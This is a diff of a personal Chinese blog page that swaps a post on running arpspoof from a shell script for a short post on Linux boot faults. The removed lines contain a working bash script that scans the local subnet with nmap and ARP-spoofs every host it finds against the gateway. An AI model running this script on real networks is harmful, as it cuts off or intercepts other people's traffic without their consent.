@@ -4,8 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="arpspoof使用shell脚本, 良知  同理心 公理">
-    <meta name="description" content="使用shell脚本1234567891011121314151617181920212223242526272829303132#!&amp;#x2F;bin&amp;#x2F;bash#auto make arp 攻击#by bingyangcd &amp;#x">
+    <meta name="keywords" content="Linux操作系统启动原理和故障分析, 良知  同理心 公理">
+    <meta name="description" content="详细描述Linux系统启动原理，各种常见的故障和修复方法，以及对比一些核心组件在各版本Linux系统上的功能差异。
+
+b站視頻地址
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +16,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>arpspoof使用shell脚本 | 小文博客</title>
+    <title>Linux操作系统启动原理和故障分析 | 小文博客</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/iseland/iseland.github.io/logo.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/iseland/iseland.github.io/libs/awesome/css/all.css">
@@ -303,12 +306,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://www.photock.jp/photo/middle/photo0000-4207.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://www.photock.jp/photo/middle/photo0000-1769.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">arpspoof使用shell脚本</h1>
+                    <h1 class="description center-align post-title">Linux操作系统启动原理和故障分析</h1>
                 </div>
             </div>
         </div>
@@ -425,14 +428,23 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/shell/">
-                                <span class="chip bg-color">shell</span>
+                            <a href="/tags/Linux/">
+                                <span class="chip bg-color">Linux</span>
                             </a>
                         
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/linux/" class="post-category">
+                                linux
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -441,21 +453,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-06-16
+                    2021-01-12
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-06-17
+                    2021-01-12
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    333
+                    52
                 </div>
                 
 
@@ -478,7 +490,9 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="使用shell脚本"><a href="#使用shell脚本" class="headerlink" title="使用shell脚本"></a>使用shell脚本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">#auto make arp 攻击</span><br><span class="line">#by bingyang</span><br><span class="line"></span><br><span class="line">cd &#x2F;home&#x2F; &amp;&amp; mkdir arp &amp;&amp; cd arp&#x2F;</span><br><span class="line">ip&#x3D;&#96;ifconfig | grep &#39;inet 19&#39; | sed &#39;s&#x2F;^ .*inet &#x2F;&#x2F;g&#39;| sed &#39;s&#x2F; net.*$&#x2F;&#x2F;g&#39;&#96; #获得本机ip</span><br><span class="line">sour&#x3D;&#96;ifconfig | grep &#39;inet 19&#39; | sed &#39;s&#x2F;^ .*inet &#x2F;&#x2F;g&#39;| sed &#39;s&#x2F; net.*$&#x2F;&#x2F;g&#39;| cut -d&#39;.&#39; -f 3&#96; #获得本机网关关键值</span><br><span class="line">IPaddress&#x3D;192.168.$sour.0&#x2F;24</span><br><span class="line">gateway&#x3D;192.168.$sour.1</span><br><span class="line">echo -e &quot;\033[32m仅供安全测试及安全学习,禁止非法使用!\033[0m&quot;</span><br><span class="line">echo -e &quot;\033[32m仅供安全测试及安全学习,禁止非法使用!\033[0m&quot;</span><br><span class="line">echo -e &quot;\033[32m仅供安全测试及安全学习,禁止非法使用!\033[0m&quot;</span><br><span class="line">echo -e &quot;\033[32--------------------开始安装框架--------------------------------\033[0m&quot;</span><br><span class="line">echo -e &quot;\033[32marp自动攻击脚本\033[0m&quot;</span><br><span class="line">echo -e &quot;\033[32----------------解锁目标------------------------------------\033[0m&quot;</span><br><span class="line">touch &#x2F;home&#x2F;arp&#x2F;listip.txt</span><br><span class="line">wenben&#x3D;&#x2F;home&#x2F;arp&#x2F;listip.txt</span><br><span class="line">echo $IPaddress</span><br><span class="line">echo $ip</span><br><span class="line">echo $sour</span><br><span class="line"></span><br><span class="line">#&gt;$wenben</span><br><span class="line">ipp&#x3D;$(nmap -sP $IPaddress | grep &#39;Nmap s&#39; | cut -d &#39; &#39; -f 5 | sed &#39;1d&#39;| grep -v $ip)</span><br><span class="line">wait</span><br><span class="line">echo &quot;$ipp&quot; | tee -a $wenben</span><br><span class="line">#进行arp群体攻击，目标来自于文件，如果想让自己上网，就把自己的IP从文件中去掉</span><br><span class="line">while read list</span><br><span class="line">do</span><br><span class="line">    &#123;</span><br><span class="line">arpspoof -i ens33 -t $list $gateway</span><br><span class="line">&#125;</span><br><span class="line">done &lt; &#x2F;home&#x2F;arp&#x2F;listip.txt</span><br></pre></td></tr></table></figure>
+                <p>详细描述Linux系统启动原理，各种常见的故障和修复方法，以及对比一些核心组件在各版本Linux系统上的功能差异。<br><img src="http://pan-yz.chaoxing.com/preview/showpreview_555821931838423040.html?v=1610451293000" alt="笔记"></p>
+<hr>
+<p><a href="https://www.bilibili.com/video/BV16a411F74Z" target="_blank" rel="noopener">b站視頻地址</a></p>
 
             </div>
             <hr/>
@@ -494,7 +508,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://iseland.github.io" rel="external nofollow noreferrer">binyang</a>
+                    <a href="https://iseland.github.io" rel="external nofollow noreferrer">bingyan</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -504,7 +518,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://iseland.github.io/2020/06/16/arpspoof%E4%BD%BF%E7%94%A8shell%E8%84%9A%E6%9C%AC/">https://iseland.github.io/2020/06/16/arpspoof%E4%BD%BF%E7%94%A8shell%E8%84%9A%E6%9C%AC/</a>
+                    <a href="https://iseland.github.io/2021/01/12/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86%E5%92%8C%E6%95%85%E9%9A%9C%E5%88%86%E6%9E%90/">https://iseland.github.io/2021/01/12/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86%E5%92%8C%E6%95%85%E9%9A%9C%E5%88%86%E6%9E%90/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -517,7 +531,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="https://iseland.github.io" target="_blank">binyang</a>
+                    <a href="https://iseland.github.io" target="_blank">bingyan</a>
                     !
                 </span>
             </div>
@@ -542,8 +556,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/shell/">
-                                    <span class="chip bg-color">shell</span>
+                                <a href="/tags/Linux/">
+                                    <span class="chip bg-color">Linux</span>
                                 </a>
                             
                         </div>
@@ -584,9 +598,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/01/12/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86%E5%92%8C%E6%95%85%E9%9A%9C%E5%88%86%E6%9E%90/">
                     <div class="card-image">
@@ -606,9 +621,9 @@ b站視頻地址
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-12
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -621,6 +636,7 @@ b站視頻地址
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -639,25 +655,23 @@ b站視頻地址
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/03/16/centos7%E4%B8%ADpython2%E5%8D%87%E7%B4%9Apython3/">
+                <a href="/2020/06/16/arpspoof%E4%BD%BF%E7%94%A8shell%E8%84%9A%E6%9C%AC/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/iseland/iseland.github.iohttps://www.photock.jp/photo/middle/photo0000-1922.jpg" class="responsive-img" alt="Linux centos7 升级安装Python2到3">
+                        <img src="https://cdn.jsdelivr.net/gh/iseland/iseland.github.iohttps://www.photock.jp/photo/middle/photo0000-4207.jpg" class="responsive-img" alt="arpspoof使用shell脚本">
                         
-                        <span class="card-title">Linux centos7 升级安装Python2到3</span>
+                        <span class="card-title">arpspoof使用shell脚本</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            运行python -V记住此时旧版本号
-1、安装必备软件
-yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-dev
+                            使用shell脚本1234567891011121314151617181920212223242526272829303132#!&#x2F;bin&#x2F;bash#auto make arp 攻击#by bingyangcd &#x
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-16
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-06-16
                             </span>
                         <span class="publish-author">
                             
@@ -670,8 +684,8 @@ yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel r
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/centos7/">
-                        <span class="chip bg-color">centos7</span>
+                    <a href="/tags/shell/">
+                        <span class="chip bg-color">shell</span>
                     </a>
                     
                 </div>
@@ -846,6 +860,13 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 
 </main>
 
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
+    });
+</script>
 
 
     <footer class="page-footer bg-color">
